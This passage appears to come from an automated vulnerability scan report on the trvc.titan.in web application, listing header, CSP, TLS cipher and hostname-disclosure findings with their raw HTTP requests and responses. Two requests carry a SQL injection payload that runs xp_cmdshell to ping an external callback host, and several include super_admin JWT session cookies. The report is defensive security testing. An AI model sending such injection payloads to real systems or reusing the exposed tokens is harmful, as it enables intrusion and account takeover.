+content-security-policy:default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+x-frame-options:DENY
+x-content-type-options:nosniff
+referrer-policy:strict-origin-when-cross-origin
+permissions-policy:camera=(), microphone=(), geolocation=(), payment=()
+server:
+date:Wed, 30 Sep 2026 06:46:31 GMT
+connection:close
+content-length:1762",https://trvc.titan.in/libs/,,"An attacker can use the disclosed internal IP address and infrastructure information to gather details about the application's internal network architecture. This information may assist in identifying internal services or infrastructure that could be targeted during further reconnaissance and exploitation activities.
+"
+27,5584076,Internal IP Address/Hostname Exposure,23-09-2026 13:22,30-09-2026 12:15,OPEN,Low,https://trvc.titan.in/default.htm,Internal hostname exposed: localhost:3001,,,,5.3,AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N,,,"GET /default.htm HTTP/1.1 
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding:gzip, deflate, br, zstd
+Accept-Language:en-US
+Sec-Fetch-Dest:document
+Sec-Fetch-Mode:navigate
+Sec-Fetch-Site:none
+Sec-Fetch-User:?1
+Upgrade-Insecure-Requests:1
+User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.186 Electron/32.3.3 Safari/537.36
+Host:trvc.titan.in","HTTP/1.1 200 OK 
+cache-control:no-cache,no-cache, no-store, must-revalidate
+pragma:no-cache
+content-type:text/html
+last-modified:Wed, 09 Sep 2026 07:19:38 GMT
+accept-ranges:bytes
+etag:""0a1b3922b40dd1:0""
+strict-transport-security:max-age=31536000; includeSubDomains; preload
+content-security-policy:default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+x-frame-options:DENY
+x-content-type-options:nosniff
+referrer-policy:strict-origin-when-cross-origin
+permissions-policy:camera=(), microphone=(), geolocation=(), payment=()
+server:
+date:Wed, 30 Sep 2026 06:45:53 GMT
+connection:close
+content-length:10897",https://trvc.titan.in/default.htm,,"An attacker can use the disclosed internal IP address and infrastructure information to gather details about the application's internal network architecture. This information may assist in identifying internal services or infrastructure that could be targeted during further reconnaissance and exploitation activities.
+"
+28,5582895,Web Server Info Disclosure,22-09-2026 11:28,30-09-2026 11:48,OPEN,Info,https://trvc.titan.in/api/me,"Web server information disclosed in Server header: Microsoft-HTTPAPI/2.0; Impact: Exposed server or software information allows attackers to identify known vulnerabilities (CVEs), reduce reconnaissance effort, and perform targeted exploitation.",,,PROPFIND,0,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N,,,"PROPFIND /api/me HTTP/1.1 
+Accept:application/json, text/plain, */*
+Accept-Encoding:gzip, deflate, br, zstd
+Accept-Language:en-US
+Referer:https://trvc.titan.in/
+Sec-Fetch-Dest:empty
+Sec-Fetch-Mode:cors
+Sec-Fetch-Site:same-origin
+User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.186 Electron/32.3.3 Safari/537.36
+sec-ch-ua:""Not;A=Brand"";v=""24"", ""Chromium"";v=""128""
+sec-ch-ua-mobile:?0
+sec-ch-ua-platform:""Linux""
+x-e2ee-client:true
+host:
+content-length"":0,""Host:trvc.titan.in","HTTP/1.1 404 Not Found 
+content-type:text/html; charset=us-ascii
+server:Microsoft-HTTPAPI/2.0
+date:Wed, 30 Sep 2026 06:18:47 GMT
+connection:close
+content-length:315",https://trvc.titan.in/api/me,,"An attacker can use the disclosed server technology information to perform targeted reconnaissance and identify potential vulnerabilities associated with the exposed web server. While the disclosure alone does not provide direct access to application data, it can assist in planning further attacks when combined with other vulnerabilities."
+29,5584733,"Diffie-Hellman Ephemeral Key Exchange DoS Vulnerability (SSL/TLS, D(HE)ater)",24-09-2026 11:39,30-09-2026 11:38,OPEN,High,https://trvc.titan.in/,"'DHE' cipher suites accepted by this service via the TLSv1.2 protocol:
+
+TLS_DHE_RSA_WITH_AES_128_GCM_SHA256
+TLS_DHE_RSA_WITH_AES_256_GCM_SHA384",,,,7.5,AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,,,,,,,
+30,5588993,Programming Language And Version Information Disclosure,30-09-2026 11:38,30-09-2026 11:38,NEW,Low,https://trvc.titan.in/api/me/photo,Framework information disclosed via HTTP headers (x-powered-by: ARR/3.0); Impact: Exposed framework or runtime information enables attackers to target known vulnerabilities and tailor exploits.,,,,0,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N,,,"GET /api/me/photo HTTP/1.1 
+Accept:application/json, text/plain, */*
+Accept-Encoding:gzip, deflate, br, zstd
+Accept-Language:en-US
+Cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGdtYWlsLmNvbSIsIm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcl9hZG1pbiIsImV4cCI6MTc5MzI2NzU4ODU3OH0.lQGIV6Q8nlB6W_sh2NaKMQg9Zvajk70aDicaZIylJIs
+Referer:https://trvc.titan.in/super-admin
+Sec-Fetch-Dest:empty
+Sec-Fetch-Mode:cors
+Sec-Fetch-Site:same-origin
+User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.186 Electron/32.3.3 Safari/537.36
+sec-ch-ua:""Not;A=Brand"";v=""24"", ""Chromium"";v=""128""
+sec-ch-ua-mobile:?0
+sec-ch-ua-platform:""Linux""
+x-e2ee-client:true
+Host:trvc.titan.in","HTTP/1.1 204 No Content 
+cache-control:no-store, no-cache, must-revalidate, private,no-cache, no-store, must-revalidate
+keep-alive:timeout=5
+pragma:no-cache,no-cache
+expires:0
+vary:Origin
+x-request-id:2a3da970-92cd-408d-b1fc-c06c8953110a
+content-security-policy:default-src 'self';base-uri 'self';font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com;form-action 'self';frame-ancestors 'none';img-src 'self' data: blob:;object-src 'none';script-src 'self' 'unsafe-inline';script-src-attr 'none';style-src 'self' 'unsafe-inline';upgrade-insecure-requests;child-src 'self' blob:;connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com;frame-src 'self' https://www.youtube.com https://youtube.com;media-src 'self' blob:;worker-src 'self' blob:, default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+cross-origin-opener-policy:same-origin
+cross-origin-resource-policy:same-origin
+origin-agent-cluster:?1
+referrer-policy:no-referrer, strict-origin-when-cross-origin
+strict-transport-security:max-age=31536000; includeSubDomains; preload, max-age=31536000; includeSubDomains; preload
+x-content-type-options:nosniff, nosniff
+x-dns-prefetch-control:off
+x-download-options:noopen
+x-frame-options:SAMEORIGIN, DENY
+x-permitted-cross-domain-policies:none
+x-xss-protection:0
+permissions-policy:camera=(), microphone=(), geolocation=(), payment=(), camera=(), microphone=(), geolocation=(), payment=()
+access-control-allow-private-network:true
+access-control-allow-credentials:true
+ratelimit-policy:1000;w=60
+ratelimit-limit:1000
+ratelimit-remaining:999
+ratelimit-reset:60
+x-powered-by:ARR/3.0
+server:
+date:Wed, 30 Sep 2026 06:08:31 GMT
+connection:close",https://trvc.titan.in/api/me/photo,,"An attacker can use the disclosed technology and version information to identify the underlying server components and perform targeted reconnaissance. This information may help an attacker select exploits or attacks relevant to the identified technology, increasing the risk of further attacks when combined with other vulnerabilities.
+"
+31,5588989,Programming Language And Version Information Disclosure,30-09-2026 11:35,30-09-2026 11:35,NEW,Low,https://trvc.titan.in/api/events,Framework information disclosed via HTTP headers (x-powered-by: ARR/3.0); Impact: Exposed framework or runtime information enables attackers to target known vulnerabilities and tailor exploits.,,,"'OR'1'!='0;EXEC xp_cmdshell(""ping ace675d0-1c5c-4aef-b06d-1405961da103.88089.5302184.14920267.332834.haikuscan.indusfacefinder.in"")--",0,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N,,,"GET /api/events HTTP/1.1 
+Accept:text/event-stream
+Accept-Encoding:gzip, deflate, br, zstd
+Accept-Language:en-US
+Cache-Control:no-cache
+Cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGdtYWlsLmNvbSIsIm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcl9hZG1pbiIsImV4cCI6MTc5MzI2MzE4NjYyMH0.uy1kGEC1h_6-u39W7btTMmKsxMd5pvgdKpVcfGTvlBU
+Referer:https://trvc.titan.in/super-admin
+Sec-Fetch-Dest:empty
+Sec-Fetch-Mode:cors
+Sec-Fetch-Site:same-origin
+User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.186 Electron/32.3.3 Safari/537.36
+sec-ch-ua:""Not;A=Brand"";v=""24"", ""Chromium"";v=""128""
+sec-ch-ua-mobile:?0
+sec-ch-ua-platform:""Linux""
+Origin:'OR'1'!='0;EXEC xp_cmdshell(""ping ace675d0-1c5c-4aef-b06d-1405961da103.88089.5302184.14920267.332834.haikuscan.indusfacefinder.in"")--
+Host:trvc.titan.in","HTTP/1.1 403 Forbidden 
+cache-control:no-cache, no-store, must-revalidate
+keep-alive:timeout=5
+pragma:no-cache
+content-type:application/json; charset=utf-8
+etag:W/""c7-IcZYYSD/cLygNTWV6Z66PxUgx+c""
+x-request-id:3d7c55aa-77ee-4c88-9c26-d07def5d69ce
+content-security-policy:default-src 'self';base-uri 'self';font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com;form-action 'self';frame-ancestors 'none';img-src 'self' data: blob:;object-src 'none';script-src 'self' 'unsafe-inline';script-src-attr 'none';style-src 'self' 'unsafe-inline';upgrade-insecure-requests;child-src 'self' blob:;connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com;frame-src 'self' https://www.youtube.com https://youtube.com;media-src 'self' blob:;worker-src 'self' blob:, default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+cross-origin-opener-policy:same-origin
+cross-origin-resource-policy:same-origin
+origin-agent-cluster:?1
+referrer-policy:no-referrer, strict-origin-when-cross-origin
+strict-transport-security:max-age=31536000; includeSubDomains; preload, max-age=31536000; includeSubDomains; preload
+x-content-type-options:nosniff, nosniff
+x-dns-prefetch-control:off
+x-download-options:noopen
+x-frame-options:SAMEORIGIN, DENY
+x-permitted-cross-domain-policies:none
+x-xss-protection:0
+permissions-policy:camera=(), microphone=(), geolocation=(), payment=(), camera=(), microphone=(), geolocation=(), payment=()
+access-control-allow-private-network:true
+x-powered-by:ARR/3.0
+server:
+date:Wed, 30 Sep 2026 06:05:39 GMT
+connection:close
+content-length:199",https://trvc.titan.in/api/events,,"An attacker can use the disclosed technology and version information to identify the underlying server components and perform targeted reconnaissance. This information may help an attacker select exploits or attacks relevant to the identified technology, increasing the risk of further attacks when combined with other vulnerabilities.
+"
+32,5584009,Programming Language And Version Information Disclosure,23-09-2026 11:25,30-09-2026 11:33,OPEN,Low,https://trvc.titan.in/api/auth/microsoft/url,Framework information disclosed via HTTP headers (x-powered-by: ARR/3.0); Impact: Exposed framework or runtime information enables attackers to target known vulnerabilities and tailor exploits.,,,"'OR'1'!='0;EXEC xp_cmdshell(""ping 3e3aafa2-7cd8-47c3-a7c9-e27c22cdb684.88089.5302184.14920267.332834.haikuscan.indusfacefinder.in"")--",0,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N,,,"GET /api/auth/microsoft/url HTTP/1.1 
+Accept:application/json, text/plain, */*
+Accept-Encoding:gzip, deflate, br, zstd
+Accept-Language:en-US
+Referer:https://trvc.titan.in/login
+Sec-Fetch-Dest:empty
+Sec-Fetch-Mode:cors
+Sec-Fetch-Site:same-origin
+User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.186 Electron/32.3.3 Safari/537.36
+sec-ch-ua:""Not;A=Brand"";v=""24"", ""Chromium"";v=""128""
+sec-ch-ua-mobile:?0
+sec-ch-ua-platform:""Linux""
+x-e2ee-client:true
+Origin:'OR'1'!='0;EXEC xp_cmdshell(""ping 3e3aafa2-7cd8-47c3-a7c9-e27c22cdb684.88089.5302184.14920267.332834.haikuscan.indusfacefinder.in"")--
+Host:trvc.titan.in","HTTP/1.1 403 Forbidden 
+cache-control:no-cache, no-store, must-revalidate
+keep-alive:timeout=5
+pragma:no-cache
+content-type:application/json; charset=utf-8
+etag:W/""c7-TyI7ShUCkczglib0zf0PqZSHji4""
+x-request-id:f564482f-0cbe-464f-bcb1-d61589178fae
+content-security-policy:default-src 'self';base-uri 'self';font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com;form-action 'self';frame-ancestors 'none';img-src 'self' data: blob:;object-src 'none';script-src 'self' 'unsafe-inline';script-src-attr 'none';style-src 'self' 'unsafe-inline';upgrade-insecure-requests;child-src 'self' blob:;connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com;frame-src 'self' https://www.youtube.com https://youtube.com;media-src 'self' blob:;worker-src 'self' blob:, default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+cross-origin-opener-policy:same-origin
+cross-origin-resource-policy:same-origin
+origin-agent-cluster:?1
+referrer-policy:no-referrer, strict-origin-when-cross-origin
+strict-transport-security:max-age=31536000; includeSubDomains; preload, max-age=31536000; includeSubDomains; preload
+x-content-type-options:nosniff, nosniff
+x-dns-prefetch-control:off
+x-download-options:noopen
+x-frame-options:SAMEORIGIN, DENY
+x-permitted-cross-domain-policies:none
+x-xss-protection:0
+permissions-policy:camera=(), microphone=(), geolocation=(), payment=(), camera=(), microphone=(), geolocation=(), payment=()
+access-control-allow-private-network:true
+x-powered-by:ARR/3.0
+server:
+date:Wed, 30 Sep 2026 06:03:42 GMT
+connection:close
+content-length:199",https://trvc.titan.in/api/auth/microsoft/url,,"An attacker can use the disclosed technology and version information to identify the underlying server components and perform targeted reconnaissance. This information may help an attacker select exploits or attacks relevant to the identified technology, increasing the risk of further attacks when combined with other vulnerabilities.
+"
+33,5582930,Microsoft IIS Version Disclosure,22-09-2026 12:04,30-09-2026 11:29,OPEN,Info,http://trvc.titan.in/,"Microsoft IIS information disclosed in Server header: Microsoft-IIS/10.0; Impact: Exposed server or software information allows attackers to identify known vulnerabilities (CVEs), reduce reconnaissance effort, and perform targeted exploitation.",,,,0,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N,,,"GET / HTTP/1.1 
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding:gzip, deflate, br, zstd
+Accept-Language:en-US
+Sec-Fetch-Dest:document
+Sec-Fetch-Mode:navigate
+Sec-Fetch-Site:none
+Sec-Fetch-User:?1
+Upgrade-Insecure-Requests:1
+User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.186 Electron/32.3.3 Safari/537.36
+Host:trvc.titan.in","HTTP/1.1 403 Forbidden 
+content-type:text/html
+server:Microsoft-IIS/10.0
+date:Wed, 30 Sep 2026 05:59:10 GMT
+connection:close
+content-length:1233",http://trvc.titan.in/,,
+34,5582932,Unset/Insecure CSP Header Vulnerability,22-09-2026 12:04,30-09-2026 11:27,OPEN,Medium,https://trvc.titan.in/,"Content-Security-Policy header is set but misconfigured. Findings: Missing essential directives: require-trusted-types-for, report-uri, report-to; script-src allows 'unsafe-inline', enabling inline script execution and weakening XSS protection; script-src allows 'unsafe-eval', enabling code injection via eval(). Current header: &quot;default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;&quot;. Impact: Weak or misconfigured CSP (e.g. unsafe-inline, unsafe-eval, or missing essential directives) reduces effectiveness against XSS, script injection, and data exfiltration.",,,,3.7,AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N,,,"GET / HTTP/1.1 
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding:gzip, deflate, br, zstd
+Accept-Language:en-US
+Cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGdtYWlsLmNvbSIsIm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcl9hZG1pbiIsImV4cCI6MTc5MzI1MzM5NzMzOH0.sFCEWOZGbRCG8oBryzhYuW3WzFtFv9emfvS9JTNM3qs
+Sec-Fetch-Dest:document
+Sec-Fetch-Mode:navigate
+Sec-Fetch-Site:none
+Sec-Fetch-User:?1
+Upgrade-Insecure-Requests:1
+User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.186 Electron/32.3.3 Safari/537.36
+Host:trvc.titan.in","HTTP/1.1 200 OK 
+cache-control:no-cache,no-cache, no-store, must-revalidate
+pragma:no-cache
+content-type:text/html
+content-encoding:gzip
+last-modified:Wed, 09 Sep 2026 07:19:38 GMT
+accept-ranges:bytes
+etag:""0a1b3922b40dd1:0""
+vary:Accept-Encoding
+strict-transport-security:max-age=31536000; includeSubDomains; preload
+content-security-policy:default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+x-frame-options:DENY
+x-content-type-options:nosniff
+referrer-policy:strict-origin-when-cross-origin
+permissions-policy:camera=(), microphone=(), geolocation=(), payment=()
+server:
+date:Wed, 30 Sep 2026 05:57:24 GMT
+connection:close
+content-length:1762",https://trvc.titan.in/,,"An attacker who is able to exploit another client-side vulnerability may have a higher chance of executing unauthorized scripts because the CSP provides weaker restrictions. This may increase the impact of XSS or other client-side attacks, although the CSP misconfiguration alone does not directly provide unauthorized access.
+"
+35,5582931,Internal IP Address/Hostname Exposure,22-09-2026 12:04,30-09-2026 11:27,OPEN,Low,https://trvc.titan.in/,Internal hostname exposed: localhost:3001,,,,5.3,AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N,,,"GET / HTTP/1.1 
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding:gzip, deflate, br, zstd
+Accept-Language:en-US
+Cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGdtYWlsLmNvbSIsIm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcl9hZG1pbiIsImV4cCI6MTc5MzI1MzM5NzMzOH0.sFCEWOZGbRCG8oBryzhYuW3WzFtFv9emfvS9JTNM3qs
+Sec-Fetch-Dest:document
+Sec-Fetch-Mode:navigate
+Sec-Fetch-Site:none
+Sec-Fetch-User:?1
+Upgrade-Insecure-Requests:1
+User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.186 Electron/32.3.3 Safari/537.36
+Host:trvc.titan.in","HTTP/1.1 200 OK 
+cache-control:no-cache,no-cache, no-store, must-revalidate
+pragma:no-cache
+content-type:text/html
+content-encoding:gzip
+last-modified:Wed, 09 Sep 2026 07:19:38 GMT
+accept-ranges:bytes
+etag:""0a1b3922b40dd1:0""
+vary:Accept-Encoding
+strict-transport-security:max-age=31536000; includeSubDomains; preload
+content-security-policy:default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+x-frame-options:DENY
+x-content-type-options:nosniff
+referrer-policy:strict-origin-when-cross-origin
+permissions-policy:camera=(), microphone=(), geolocation=(), payment=()
+server:
+date:Wed, 30 Sep 2026 05:57:24 GMT
+connection:close
+content-length:1762",https://trvc.titan.in/,,An attacker can use the disclosed internal IP address and infrastructure information to gather details about the application's internal network architecture. This information may assist in identifying internal services or infrastructure that could be targeted during further reconnaissance and exploitation activities.
